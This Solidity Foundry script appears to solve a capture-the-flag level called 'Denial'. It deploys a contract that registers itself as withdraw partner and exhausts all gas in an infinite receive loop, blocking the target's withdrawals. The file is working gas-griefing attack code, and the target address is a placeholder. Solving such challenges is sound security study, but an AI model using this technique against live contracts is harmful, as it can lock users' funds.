// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Denial} from "../src/Denial.sol";
import "../lib/forge-std/src/Script.sol";

// Attack contract that creates a denial of service by consuming all gas in the fallback function
contract DenialAttackContract {
    Denial denialInstance = Denial(payable(0xYourInstanceAddressHere)); // Replace with the actual instance address

    // Constructor sets the contract as the withdraw partner
    constructor() {
        denialInstance.setWithdrawPartner(address(this));
    }

    // Fallback function deliberately consumes all gas in an infinite loop
    receive() external payable {
        while(true) {
            // Infinite loop to exhaust all gas
        }
    }
}

// Script to perform the denial of service attack
contract DenialAttackScript is Script {
    DenialAttackContract denialAttacker;
    Denial denialInstance = Denial(payable(0xYourInstanceAddressHere)); // Replace with the actual instance address

    function run() external {
        // Start the transaction using the private key from the environment variables
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the attack contract and set it as the withdraw partner
        denialAttacker = new DenialAttackContract();

        // Stop the broadcast after the transaction
        vm.stopBroadcast();
    }
}